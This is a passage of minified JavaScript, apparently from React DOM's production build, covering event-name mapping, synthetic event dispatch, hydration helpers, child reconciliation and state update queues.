Io={animationend:wu("Animation","AnimationEnd"),animationiteration:wu("Animation","AnimationIteration"),animationstart:wu("Animation","AnimationStart"),transitionend:wu("Transition","TransitionEnd")},Pd={},p0={};c&&(p0=document.createElement("div").style,"AnimationEvent"in window||(delete Io.animationend.animation,delete Io.animationiteration.animation,delete Io.animationstart.animation),"TransitionEvent"in window||delete Io.transitionend.transition);function vu(s){if(Pd[s])return Pd[s];if(!Io[s])return s;var a=Io[s],h;for(h in a)if(a.hasOwnProperty(h)&&h in p0)return Pd[s]=a[h];return s}var g0=vu("animationend"),y0=vu("animationiteration"),m0=vu("animationstart"),w0=vu("transitionend"),v0=new Map,b0="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Hi(s,a){v0.set(s,a),o(a,[s])}for(var Td=0;Td<b0.length;Td++){var Ad=b0[Td],n$=Ad.toLowerCase(),r$=Ad[0].toUpperCase()+Ad.slice(1);Hi(n$,"on"+r$)}Hi(g0,"onAnimationEnd"),Hi(y0,"onAnimationIteration"),Hi(m0,"onAnimationStart"),Hi("dblclick","onDoubleClick"),Hi("focusin","onFocus"),Hi("focusout","onBlur"),Hi(w0,"onTransitionEnd"),l("onMouseEnter",["mouseout","mouseover"]),l("onMouseLeave",["mouseout","mouseover"]),l("onPointerEnter",["pointerout","pointerover"]),l("onPointerLeave",["pointerout","pointerover"]),o("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),o("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),o("onBeforeInput",["compositionend","keypress","textInput","paste"]),o("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),o("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),o("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var bl="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),i$=new Set("cancel close invalid load scroll toggle".split(" ").concat(bl));function E0(s,a,h){var p=s.type||"unknown-event";s.currentTarget=h,n3(p,a,void 0,s),s.currentTarget=null}function x0(s,a){a=(a&4)!==0;for(var h=0;h<s.length;h++){var p=s[h],v=p.event;p=p.listeners;e:{var _=void 0;if(a)for(var L=p.length-1;0<=L;L--){var Y=p[L],Z=Y.instance,oe=Y.currentTarget;if(Y=Y.listener,Z!==_&&v.isPropagationStopped())break e;E0(v,Y,oe),_=Z}else for(L=0;L<p.length;L++){if(Y=p[L],Z=Y.instance,oe=Y.currentTarget,Y=Y.listener,Z!==_&&v.isPropagationStopped())break e;E0(v,Y,oe),_=Z}}}if(ru)throw s=ad,ru=!1,ad=null,s}function ht(s,a){var h=a[jd];h===void 0&&(h=a[jd]=new Set);var p=s+"__bubble";h.has(p)||(S0(a,s,2,!1),h.add(p))}function Cd(s,a,h){var p=0;a&&(p|=4),S0(h,s,p,a)}var bu="_reactListening"+Math.random().toString(36).slice(2);function El(s){if(!s[bu]){s[bu]=!0,r.forEach(function(h){h!=="selectionchange"&&(i$.has(h)||Cd(h,!1,s),Cd(h,!0,s))});var a=s.nodeType===9?s:s.ownerDocument;a===null||a[bu]||(a[bu]=!0,Cd("selectionchange",!1,a))}}function S0(s,a,h,p){switch(Ww(a)){case 1:var v=w3;break;case 4:v=v3;break;default:v=pd}h=v.bind(null,a,h,s),v=void 0,!od||a!=="touchstart"&&a!=="touchmove"&&a!=="wheel"||(v=!0),p?v!==void 0?s.addEventListener(a,h,{capture:!0,passive:v}):s.addEventListener(a,h,!0):v!==void 0?s.addEventListener(a,h,{passive:v}):s.addEventListener(a,h,!1)}function Rd(s,a,h,p,v){var _=p;if((a&1)===0&&(a&2)===0&&p!==null)e:for(;;){if(p===null)return;var L=p.tag;if(L===3||L===4){var Y=p.stateNode.containerInfo;if(Y===v||Y.nodeType===8&&Y.parentNode===v)break;if(L===4)for(L=p.return;L!==null;){var Z=L.tag;if((Z===3||Z===4)&&(Z=L.stateNode.containerInfo,Z===v||Z.nodeType===8&&Z.parentNode===v))return;L=L.return}for(;Y!==null;){if(L=_s(Y),L===null)return;if(Z=L.tag,Z===5||Z===6){p=_=L;continue e}Y=Y.parentNode}}p=p.return}Pw(function(){var oe=_,ye=rd(h),we=[];e:{var ge=v0.get(s);if(ge!==void 0){var Se=md,Ie=s;switch(s){case"keypress":if(pu(h)===0)break e;case"keydown":case"keyup":Se=N3;break;case"focusin":Ie="focus",Se=bd;break;case"focusout":Ie="blur",Se=bd;break;case"beforeblur":case"afterblur":Se=bd;break;case"click":if(h.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":Se=Yw;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":Se=x3;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":Se=L3;break;case g0:case y0:case m0:Se=I3;break;case w0:Se=U3;break;case"scroll":Se=b3;break;case"wheel":Se=F3;break;case"copy":case"cut":case"paste":Se=$3;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":Se=Zw}var $e=(a&4)!==0,St=!$e&&s==="scroll",re=$e?ge!==null?ge+"Capture":null:ge;$e=[];for(var X=oe,ie;X!==null;){ie=X;var ve=ie.stateNode;if(ie.tag===5&&ve!==null&&(ie=ve,re!==null&&(ve=rl(X,re),ve!=null&&$e.push(xl(X,ve,ie)))),St)break;X=X.return}0<$e.length&&(ge=new Se(ge,Ie,null,h,ye),we.push({event:ge,listeners:$e}))}}if((a&7)===0){e:{if(ge=s==="mouseover"||s==="pointerover",Se=s==="mouseout"||s==="pointerout",ge&&h!==Ye&&(Ie=h.relatedTarget||h.fromElement)&&(_s(Ie)||Ie[si]))break e;if((Se||ge)&&(ge=ye.window===ye?ye:(ge=ye.ownerDocument)?ge.defaultView||ge.parentWindow:window,Se?(Ie=h.relatedTarget||h.toElement,Se=oe,Ie=Ie?_s(Ie):null,Ie!==null&&(St=Ss(Ie),Ie!==St||Ie.tag!==5&&Ie.tag!==6)&&(Ie=null)):(Se=null,Ie=oe),Se!==Ie)){if($e=Yw,ve="onMouseLeave",re="onMouseEnter",X="mouse",(s==="pointerout"||s==="pointerover")&&($e=Zw,ve="onPointerLeave",re="onPointerEnter",X="pointer"),St=Se==null?ge:Po(Se),ie=Ie==null?ge:Po(Ie),ge=new $e(ve,X+"leave",Se,h,ye),ge.target=St,ge.relatedTarget=ie,ve=null,_s(ye)===oe&&($e=new $e(re,X+"enter",Ie,h,ye),$e.target=ie,$e.relatedTarget=St,ve=$e),St=ve,Se&&Ie)t:{for($e=Se,re=Ie,X=0,ie=$e;ie;ie=Oo(ie))X++;for(ie=0,ve=re;ve;ve=Oo(ve))ie++;for(;0<X-ie;)$e=Oo($e),X--;for(;0<ie-X;)re=Oo(re),ie--;for(;X--;){if($e===re||re!==null&&$e===re.alternate)break t;$e=Oo($e),re=Oo(re)}$e=null}else $e=null;Se!==null&&_0(we,ge,Se,$e,!1),Ie!==null&&St!==null&&_0(we,St,Ie,$e,!0)}}e:{if(ge=oe?Po(oe):window,Se=ge.nodeName&&ge.nodeName.toLowerCase(),Se==="select"||Se==="input"&&ge.type==="file")var Te=G3;else if(r0(ge))if(s0)Te=Q3;else{Te=J3;var Ae=Y3}else(Se=ge.nodeName)&&Se.toLowerCase()==="input"&&(ge.type==="checkbox"||ge.type==="radio")&&(Te=Z3);if(Te&&(Te=Te(s,oe))){i0(we,Te,h,ye);break e}Ae&&Ae(s,ge,oe),s==="focusout"&&(Ae=ge._wrapperState)&&Ae.controlled&&ge.type==="number"&&ji(ge,"number",ge.value)}switch(Ae=oe?Po(oe):window,s){case"focusin":(r0(Ae)||Ae.contentEditable==="true")&&(_o=Ae,Od=oe,vl=null);break;case"focusout":vl=Od=_o=null;break;case"mousedown":$d=!0;break;case"contextmenu":case"mouseup":case"dragend":$d=!1,d0(we,h,ye);break;case"selectionchange":if(t$)break;case"keydown":case"keyup":d0(we,h,ye)}var Ce;if(xd)e:{switch(s){case"compositionstart":var De="onCompositionStart";break e;case"compositionend":De="onCompositionEnd";break e;case"compositionupdate":De="onCompositionUpdate";break e}De=void 0}else So?t0(s,h)&&(De="onCompositionEnd"):s==="keydown"&&h.keyCode===229&&(De="onCompositionStart");De&&(Qw&&h.locale!=="ko"&&(So||De!=="onCompositionStart"?De==="onCompositionEnd"&&So&&(Ce=Kw()):(qi=ye,yd="value"in qi?qi.value:qi.textContent,So=!0)),Ae=Eu(oe,De),0<Ae.length&&(De=new Jw(De,s,null,h,ye),we.push({event:De,listeners:Ae}),Ce?De.data=Ce:(Ce=n0(h),Ce!==null&&(De.data=Ce)))),(Ce=q3?H3(s,h):V3(s,h))&&(oe=Eu(oe,"onBeforeInput"),0<oe.length&&(ye=new Jw("onBeforeInput","beforeinput",null,h,ye),we.push({event:ye,listeners:oe}),ye.data=Ce))}x0(we,a)})}function xl(s,a,h){return{instance:s,listener:a,currentTarget:h}}function Eu(s,a){for(var h=a+"Capture",p=[];s!==null;){var v=s,_=v.stateNode;v.tag===5&&_!==null&&(v=_,_=rl(s,h),_!=null&&p.unshift(xl(s,_,v)),_=rl(s,a),_!=null&&p.push(xl(s,_,v))),s=s.return}return p}function Oo(s){if(s===null)return null;do s=s.return;while(s&&s.tag!==5);return s||null}function _0(s,a,h,p,v){for(var _=a._reactName,L=[];h!==null&&h!==p;){var Y=h,Z=Y.alternate,oe=Y.stateNode;if(Z!==null&&Z===p)break;Y.tag===5&&oe!==null&&(Y=oe,v?(Z=rl(h,_),Z!=null&&L.unshift(xl(h,Z,Y))):v||(Z=rl(h,_),Z!=null&&L.push(xl(h,Z,Y)))),h=h.return}L.length!==0&&s.push({event:a,listeners:L})}var s$=/\r\n?/g,o$=/\u0000|\uFFFD/g;function I0(s){return(typeof s=="string"?s:""+s).replace(s$,`
`).replace(o$,"")}function xu(s,a,h){if(a=I0(a),I0(s)!==a&&h)throw Error(n(425))}function Su(){}var Dd=null,Nd=null;function kd(s,a){return s==="textarea"||s==="noscript"||typeof a.children=="string"||typeof a.children=="number"||typeof a.dangerouslySetInnerHTML=="object"&&a.dangerouslySetInnerHTML!==null&&a.dangerouslySetInnerHTML.__html!=null}var Bd=typeof setTimeout=="function"?setTimeout:void 0,a$=typeof clearTimeout=="function"?clearTimeout:void 0,O0=typeof Promise=="function"?Promise:void 0,l$=typeof queueMicrotask=="function"?queueMicrotask:typeof O0<"u"?function(s){return O0.resolve(null).then(s).catch(c$)}:Bd;function c$(s){setTimeout(function(){throw s})}function Ld(s,a){var h=a,p=0;do{var v=h.nextSibling;if(s.removeChild(h),v&&v.nodeType===8)if(h=v.data,h==="/$"){if(p===0){s.removeChild(v),fl(a);return}p--}else h!=="$"&&h!=="$?"&&h!=="$!"||p++;h=v}while(h);fl(a)}function Vi(s){for(;s!=null;s=s.nextSibling){var a=s.nodeType;if(a===1||a===3)break;if(a===8){if(a=s.data,a==="$"||a==="$!"||a==="$?")break;if(a==="/$")return null}}return s}function $0(s){s=s.previousSibling;for(var a=0;s;){if(s.nodeType===8){var h=s.data;if(h==="$"||h==="$!"||h==="$?"){if(a===0)return s;a--}else h==="/$"&&a++}s=s.previousSibling}return null}var $o=Math.random().toString(36).slice(2),Ur="__reactFiber$"+$o,Sl="__reactProps$"+$o,si="__reactContainer$"+$o,jd="__reactEvents$"+$o,u$="__reactListeners$"+$o,h$="__reactHandles$"+$o;function _s(s){var a=s[Ur];if(a)return a;for(var h=s.parentNode;h;){if(a=h[si]||h[Ur]){if(h=a.alternate,a.child!==null||h!==null&&h.child!==null)for(s=$0(s);s!==null;){if(h=s[Ur])return h;s=$0(s)}return a}s=h,h=s.parentNode}return null}function _l(s){return s=s[Ur]||s[si],!s||s.tag!==5&&s.tag!==6&&s.tag!==13&&s.tag!==3?null:s}function Po(s){if(s.tag===5||s.tag===6)return s.stateNode;throw Error(n(33))}function _u(s){return s[Sl]||null}var Ud=[],To=-1;function Wi(s){return{current:s}}function ft(s){0>To||(s.current=Ud[To],Ud[To]=null,To--)}function at(s,a){To++,Ud[To]=s.current,s.current=a}var Ki={},hn=Wi(Ki),In=Wi(!1),Is=Ki;function Ao(s,a){var h=s.type.contextTypes;if(!h)return Ki;var p=s.stateNode;if(p&&p.__reactInternalMemoizedUnmaskedChildContext===a)return p.__reactInternalMemoizedMaskedChildContext;var v={},_;for(_ in h)v[_]=a[_];return p&&(s=s.stateNode,s.__reactInternalMemoizedUnmaskedChildContext=a,s.__reactInternalMemoizedMaskedChildContext=v),v}function On(s){return s=s.childContextTypes,s!=null}function Iu(){ft(In),ft(hn)}function P0(s,a,h){if(hn.current!==Ki)throw Error(n(168));at(hn,a),at(In,h)}function T0(s,a,h){var p=s.stateNode;if(a=a.childContextTypes,typeof p.getChildContext!="function")return h;p=p.getChildContext();for(var v in p)if(!(v in a))throw Error(n(108,pe(s)||"Unknown",v));return V({},h,p)}function Ou(s){return s=(s=s.stateNode)&&s.__reactInternalMemoizedMergedChildContext||Ki,Is=hn.current,at(hn,s),at(In,In.current),!0}function A0(s,a,h){var p=s.stateNode;if(!p)throw Error(n(169));h?(s=T0(s,a,Is),p.__reactInternalMemoizedMergedChildContext=s,ft(In),ft(hn),at(hn,s)):ft(In),at(In,h)}var oi=null,$u=!1,Md=!1;function C0(s){oi===null?oi=[s]:oi.push(s)}function f$(s){$u=!0,C0(s)}function Gi(){if(!Md&&oi!==null){Md=!0;var s=0,a=Qe;try{var h=oi;for(Qe=1;s<h.length;s++){var p=h[s];do p=p(!0);while(p!==null)}oi=null,$u=!1}catch(v){throw oi!==null&&(oi=oi.slice(s+1)),Dw(ld,Gi),v}finally{Qe=a,Md=!1}}return null}var Co=[],Ro=0,Pu=null,Tu=0,ir=[],sr=0,Os=null,ai=1,li="";function $s(s,a){Co[Ro++]=Tu,Co[Ro++]=Pu,Pu=s,Tu=a}function R0(s,a,h){ir[sr++]=ai,ir[sr++]=li,ir[sr++]=Os,Os=s;var p=ai;s=li;var v=32-wr(p)-1;p&=~(1<<v),h+=1;var _=32-wr(a)+v;if(30<_){var L=v-v%5;_=(p&(1<<L)-1).toString(32),p>>=L,v-=L,ai=1<<32-wr(a)+v|h<<v|p,li=_+s}else ai=1<<_|h<<v|p,li=s}function Fd(s){s.return!==null&&($s(s,1),R0(s,1,0))}function zd(s){for(;s===Pu;)Pu=Co[--Ro],Co[Ro]=null,Tu=Co[--Ro],Co[Ro]=null;for(;s===Os;)Os=ir[--sr],ir[sr]=null,li=ir[--sr],ir[sr]=null,ai=ir[--sr],ir[sr]=null}var qn=null,Hn=null,gt=!1,br=null;function D0(s,a){var h=cr(5,null,null,0);h.elementType="DELETED",h.stateNode=a,h.return=s,a=s.deletions,a===null?(s.deletions=[h],s.flags|=16):a.push(h)}function N0(s,a){switch(s.tag){case 5:var h=s.type;return a=a.nodeType!==1||h.toLowerCase()!==a.nodeName.toLowerCase()?null:a,a!==null?(s.stateNode=a,qn=s,Hn=Vi(a.firstChild),!0):!1;case 6:return a=s.pendingProps===""||a.nodeType!==3?null:a,a!==null?(s.stateNode=a,qn=s,Hn=null,!0):!1;case 13:return a=a.nodeType!==8?null:a,a!==null?(h=Os!==null?{id:ai,overflow:li}:null,s.memoizedState={dehydrated:a,treeContext:h,retryLane:1073741824},h=cr(18,null,null,0),h.stateNode=a,h.return=s,s.child=h,qn=s,Hn=null,!0):!1;default:return!1}}function qd(s){return(s.mode&1)!==0&&(s.flags&128)===0}function Hd(s){if(gt){var a=Hn;if(a){var h=a;if(!N0(s,a)){if(qd(s))throw Error(n(418));a=Vi(h.nextSibling);var p=qn;a&&N0(s,a)?D0(p,h):(s.flags=s.flags&-4097|2,gt=!1,qn=s)}}else{if(qd(s))throw Error(n(418));s.flags=s.flags&-4097|2,gt=!1,qn=s}}}function k0(s){for(s=s.return;s!==null&&s.tag!==5&&s.tag!==3&&s.tag!==13;)s=s.return;qn=s}function Au(s){if(s!==qn)return!1;if(!gt)return k0(s),gt=!0,!1;var a;if((a=s.tag!==3)&&!(a=s.tag!==5)&&(a=s.type,a=a!=="head"&&a!=="body"&&!kd(s.type,s.memoizedProps)),a&&(a=Hn)){if(qd(s))throw B0(),Error(n(418));for(;a;)D0(s,a),a=Vi(a.nextSibling)}if(k0(s),s.tag===13){if(s=s.memoizedState,s=s!==null?s.dehydrated:null,!s)throw Error(n(317));e:{for(s=s.nextSibling,a=0;s;){if(s.nodeType===8){var h=s.data;if(h==="/$"){if(a===0){Hn=Vi(s.nextSibling);break e}a--}else h!=="$"&&h!=="$!"&&h!=="$?"||a++}s=s.nextSibling}Hn=null}}else Hn=qn?Vi(s.stateNode.nextSibling):null;return!0}function B0(){for(var s=Hn;s;)s=Vi(s.nextSibling)}function Do(){Hn=qn=null,gt=!1}function Vd(s){br===null?br=[s]:br.push(s)}var d$=$.ReactCurrentBatchConfig;function Il(s,a,h){if(s=h.ref,s!==null&&typeof s!="function"&&typeof s!="object"){if(h._owner){if(h=h._owner,h){if(h.tag!==1)throw Error(n(309));var p=h.stateNode}if(!p)throw Error(n(147,s));var v=p,_=""+s;return a!==null&&a.ref!==null&&typeof a.ref=="function"&&a.ref._stringRef===_?a.ref:(a=function(L){var Y=v.refs;L===null?delete Y[_]:Y[_]=L},a._stringRef=_,a)}if(typeof s!="string")throw Error(n(284));if(!h._owner)throw Error(n(290,s))}return s}function Cu(s,a){throw s=Object.prototype.toString.call(a),Error(n(31,s==="[object Object]"?"object with keys {"+Object.keys(a).join(", ")+"}":s))}function L0(s){var a=s._init;return a(s._payload)}function j0(s){function a(re,X){if(s){var ie=re.deletions;ie===null?(re.deletions=[X],re.flags|=16):ie.push(X)}}function h(re,X){if(!s)return null;for(;X!==null;)a(re,X),X=X.sibling;return null}function p(re,X){for(re=new Map;X!==null;)X.key!==null?re.set(X.key,X):re.set(X.index,X),X=X.sibling;return re}function v(re,X){return re=ns(re,X),re.index=0,re.sibling=null,re}function _(re,X,ie){return re.index=ie,s?(ie=re.alternate,ie!==null?(ie=ie.index,ie<X?(re.flags|=2,X):ie):(re.flags|=2,X)):(re.flags|=1048576,X)}function L(re){return s&&re.alternate===null&&(re.flags|=2),re}function Y(re,X,ie,ve){return X===null||X.tag!==6?(X=Bp(ie,re.mode,ve),X.return=re,X):(X=v(X,ie),X.return=re,X)}function Z(re,X,ie,ve){var Te=ie.type;return Te===D?ye(re,X,ie.props.children,ve,ie.key):X!==null&&(X.elementType===Te||typeof Te=="object"&&Te!==null&&Te.$$typeof===C&&L0(Te)===X.type)?(ve=v(X,ie.props),ve.ref=Il(re,X,ie),ve.return=re,ve):(ve=th(ie.type,ie.key,ie.props,null,re.mode,ve),ve.ref=Il(re,X,ie),ve.return=re,ve)}function oe(re,X,ie,ve){return X===null||X.tag!==4||X.stateNode.containerInfo!==ie.containerInfo||X.stateNode.implementation!==ie.implementation?(X=Lp(ie,re.mode,ve),X.return=re,X):(X=v(X,ie.children||[]),X.return=re,X)}function ye(re,X,ie,ve,Te){return X===null||X.tag!==7?(X=ks(ie,re.mode,ve,Te),X.return=re,X):(X=v(X,ie),X.return=re,X)}function we(re,X,ie){if(typeof X=="string"&&X!==""||typeof X=="number")return X=Bp(""+X,re.mode,ie),X.return=re,X;if(typeof X=="object"&&X!==null){switch(X.$$typeof){case R:return ie=th(X.type,X.key,X.props,null,re.mode,ie),ie.ref=Il(re,null,X),ie.return=re,ie;case T:return X=Lp(X,re.mode,ie),X.return=re,X;case C:var ve=X._init;return we(re,ve(X._payload),ie)}if(mr(X)||N(X))return X=ks(X,re.mode,ie,null),X.return=re,X;Cu(re,X)}return null}function ge(re,X,ie,ve){var Te=X!==null?X.key:null;if(typeof ie=="string"&&ie!==""||typeof ie=="number")return Te!==null?null:Y(re,X,""+ie,ve);if(typeof ie=="object"&&ie!==null){switch(ie.$$typeof){case R:return ie.key===Te?Z(re,X,ie,ve):null;case T:return ie.key===Te?oe(re,X,ie,ve):null;case C:return Te=ie._init,ge(re,X,Te(ie._payload),ve)}if(mr(ie)||N(ie))return Te!==null?null:ye(re,X,ie,ve,null);Cu(re,ie)}return null}function Se(re,X,ie,ve,Te){if(typeof ve=="string"&&ve!==""||typeof ve=="number")return re=re.get(ie)||null,Y(X,re,""+ve,Te);if(typeof ve=="object"&&ve!==null){switch(ve.$$typeof){case R:return re=re.get(ve.key===null?ie:ve.key)||null,Z(X,re,ve,Te);case T:return re=re.get(ve.key===null?ie:ve.key)||null,oe(X,re,ve,Te);case C:var Ae=ve._init;return Se(re,X,ie,Ae(ve._payload),Te)}if(mr(ve)||N(ve))return re=re.get(ie)||null,ye(X,re,ve,Te,null);Cu(X,ve)}return null}function Ie(re,X,ie,ve){for(var Te=null,Ae=null,Ce=X,De=X=0,Ut=null;Ce!==null&&De<ie.length;De++){Ce.index>De?(Ut=Ce,Ce=null):Ut=Ce.sibling;var qe=ge(re,Ce,ie[De],ve);if(qe===null){Ce===null&&(Ce=Ut);break}s&&Ce&&qe.alternate===null&&a(re,Ce),X=_(qe,X,De),Ae===null?Te=qe:Ae.sibling=qe,Ae=qe,Ce=Ut}if(De===ie.length)return h(re,Ce),gt&&$s(re,De),Te;if(Ce===null){for(;De<ie.length;De++)Ce=we(re,ie[De],ve),Ce!==null&&(X=_(Ce,X,De),Ae===null?Te=Ce:Ae.sibling=Ce,Ae=Ce);return gt&&$s(re,De),Te}for(Ce=p(re,Ce);De<ie.length;De++)Ut=Se(Ce,re,De,ie[De],ve),Ut!==null&&(s&&Ut.alternate!==null&&Ce.delete(Ut.key===null?De:Ut.key),X=_(Ut,X,De),Ae===null?Te=Ut:Ae.sibling=Ut,Ae=Ut);return s&&Ce.forEach(function(rs){return a(re,rs)}),gt&&$s(re,De),Te}function $e(re,X,ie,ve){var Te=N(ie);if(typeof Te!="function")throw Error(n(150));if(ie=Te.call(ie),ie==null)throw Error(n(151));for(var Ae=Te=null,Ce=X,De=X=0,Ut=null,qe=ie.next();Ce!==null&&!qe.done;De++,qe=ie.next()){Ce.index>De?(Ut=Ce,Ce=null):Ut=Ce.sibling;var rs=ge(re,Ce,qe.value,ve);if(rs===null){Ce===null&&(Ce=Ut);break}s&&Ce&&rs.alternate===null&&a(re,Ce),X=_(rs,X,De),Ae===null?Te=rs:Ae.sibling=rs,Ae=rs,Ce=Ut}if(qe.done)return h(re,Ce),gt&&$s(re,De),Te;if(Ce===null){for(;!qe.done;De++,qe=ie.next())qe=we(re,qe.value,ve),qe!==null&&(X=_(qe,X,De),Ae===null?Te=qe:Ae.sibling=qe,Ae=qe);return gt&&$s(re,De),Te}for(Ce=p(re,Ce);!qe.done;De++,qe=ie.next())qe=Se(Ce,re,De,qe.value,ve),qe!==null&&(s&&qe.alternate!==null&&Ce.delete(qe.key===null?De:qe.key),X=_(qe,X,De),Ae===null?Te=qe:Ae.sibling=qe,Ae=qe);return s&&Ce.forEach(function(W$){return a(re,W$)}),gt&&$s(re,De),Te}function St(re,X,ie,ve){if(typeof ie=="object"&&ie!==null&&ie.type===D&&ie.key===null&&(ie=ie.props.children),typeof ie=="object"&&ie!==null){switch(ie.$$typeof){case R:e:{for(var Te=ie.key,Ae=X;Ae!==null;){if(Ae.key===Te){if(Te=ie.type,Te===D){if(Ae.tag===7){h(re,Ae.sibling),X=v(Ae,ie.props.children),X.return=re,re=X;break e}}else if(Ae.elementType===Te||typeof Te=="object"&&Te!==null&&Te.$$typeof===C&&L0(Te)===Ae.type){h(re,Ae.sibling),X=v(Ae,ie.props),X.ref=Il(re,Ae,ie),X.return=re,re=X;break e}h(re,Ae);break}else a(re,Ae);Ae=Ae.sibling}ie.type===D?(X=ks(ie.props.children,re.mode,ve,ie.key),X.return=re,re=X):(ve=th(ie.type,ie.key,ie.props,null,re.mode,ve),ve.ref=Il(re,X,ie),ve.return=re,re=ve)}return L(re);case T:e:{for(Ae=ie.key;X!==null;){if(X.key===Ae)if(X.tag===4&&X.stateNode.containerInfo===ie.containerInfo&&X.stateNode.implementation===ie.implementation){h(re,X.sibling),X=v(X,ie.children||[]),X.return=re,re=X;break e}else{h(re,X);break}else a(re,X);X=X.sibling}X=Lp(ie,re.mode,ve),X.return=re,re=X}return L(re);case C:return Ae=ie._init,St(re,X,Ae(ie._payload),ve)}if(mr(ie))return Ie(re,X,ie,ve);if(N(ie))return $e(re,X,ie,ve);Cu(re,ie)}return typeof ie=="string"&&ie!==""||typeof ie=="number"?(ie=""+ie,X!==null&&X.tag===6?(h(re,X.sibling),X=v(X,ie),X.return=re,re=X):(h(re,X),X=Bp(ie,re.mode,ve),X.return=re,re=X),L(re)):h(re,X)}return St}var No=j0(!0),U0=j0(!1),Ru=Wi(null),Du=null,ko=null,Wd=null;function Kd(){Wd=ko=Du=null}function Gd(s){var a=Ru.current;ft(Ru),s._currentValue=a}function Yd(s,a,h){for(;s!==null;){var p=s.alternate;if((s.childLanes&a)!==a?(s.childLanes|=a,p!==null&&(p.childLanes|=a)):p!==null&&(p.childLanes&a)!==a&&(p.childLanes|=a),s===h)break;s=s.return}}function Bo(s,a){Du=s,Wd=ko=null,s=s.dependencies,s!==null&&s.firstContext!==null&&((s.lanes&a)!==0&&($n=!0),s.firstContext=null)}function or(s){var a=s._currentValue;if(Wd!==s)if(s={context:s,memoizedValue:a,next:null},ko===null){if(Du===null)throw Error(n(308));ko=s,Du.dependencies={lanes:0,firstContext:s}}else ko=ko.next=s;return a}var Ps=null;function Jd(s){Ps===null?Ps=[s]:Ps.push(s)}function M0(s,a,h,p){var v=a.interleaved;return v===null?(h.next=h,Jd(a)):(h.next=v.next,v.next=h),a.interleaved=h,ci(s,p)}function ci(s,a){s.lanes|=a;var h=s.alternate;for(h!==null&&(h.lanes|=a),h=s,s=s.return;s!==null;)s.childLanes|=a,h=s.alternate,h!==null&&(h.childLanes|=a),h=s,s=s.return;return h.tag===3?h.stateNode:null}var Yi=!1;function Zd(s){s.updateQueue={baseState:s.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function F0(s,a){s=s.updateQueue,a.updateQueue===s&&(a.updateQueue={baseState:s.baseState,firstBaseUpdate:s.firstBaseUpdate,lastBaseUpdate:s.lastBaseUpdate,shared:s.shared,effects:s.effects})}function ui(s,a){return{eventTime:s,lane:a,tag:0,payload:null,callback:null,next:null}}function Ji(s,a,h){var p=s.updateQueue;if(p===null)return null;if(p=p.shared,(ze&2)!==0){var v=p.pending;return v===null?a.next=a:(a.next=v.next,v.next=a),p.pending=a,ci(s,h)}return v=p.interleaved,v===null?(a.next=a,Jd(p)):(a.next=v.next,v.next=a),p.interleaved=a,ci(s,h)}function Nu(s,a,h){if(a=a.updateQueue,a!==null&&(a=a.shared,(h&4194240)!==0)){var p=a.lanes;p&=s.pendingLanes,h|=p,a.lanes=h,hd(s,h)}}function z0(s,a){var h=s.updateQueue,p=s.alternate;if(p!==null&&(p=p.updateQueue,h===p)){var v=null,_=null;if(h=h.firstBaseUpdate,h!==null){do{var L={eventTime:h.eventTime,lane:h.lane,tag:h.tag,payload:h.payload,callback:h.callback,next:null};_===null?v=_=L:_=_.next=L,h=h.next}while(h!==null);_===null?v=_=a:_=_.next=a}else v=_=a;h={baseState:p.baseState,firstBaseUpdate:v,lastBaseUpdate:_,shared:p.shared,effects:p.effects},s.updateQueue=h;return}s=h.lastBaseUpdate,s===null?h.firstBaseUpdate=a:s.next=a,h.lastBaseUpdate=a}function ku(s,a,h,p){var v=s.updateQueue;Yi=!1;var _=v.firstBaseUpdate,L=v.lastBaseUpdate,Y=v.shared.pending;if(Y!==null){v.shared.pending=null;var Z=Y,oe=Z.next;Z.next=null,L===null?_=oe:L.next=oe,L=Z;var ye=s.alternate;ye!==null&&(ye=ye.updateQueue,Y=ye.lastBaseUpdate,Y!==L&&(Y===null?ye.firstBaseUpdate=oe:Y.next=oe,ye.lastBaseUpdate=Z))}if(_!==null){var we=v.baseState;L=0,ye=oe=Z=null,Y=_;do{var ge=Y.lane,Se=Y.eventTime;if((p&ge)===ge){ye!==null&&(ye=ye.next={eventTime:Se,lane:0,tag:Y.tag,payload:Y.payload,callback:Y.callback,next:null});e:{var Ie=s,$e=Y;switch(ge=a,Se=h,$e.tag){case 1:if(Ie=$e.payload,typeof Ie=="function"){we=Ie.call(Se,we,ge);break e}we=Ie;break e;case 3:Ie.flags=Ie.flags&-65537|128;case 0:if(Ie=$e.payload,ge=typeof Ie=="function"?Ie.call(Se,we,ge):Ie,ge==null)break e;we=V({},we,ge);break e;case 2:Yi=!0}}Y.callback!==null&&Y.lane!==0&&(s.flags|=64,ge=v.effects,ge===null?v.effects=[Y]:ge.push(Y))}else 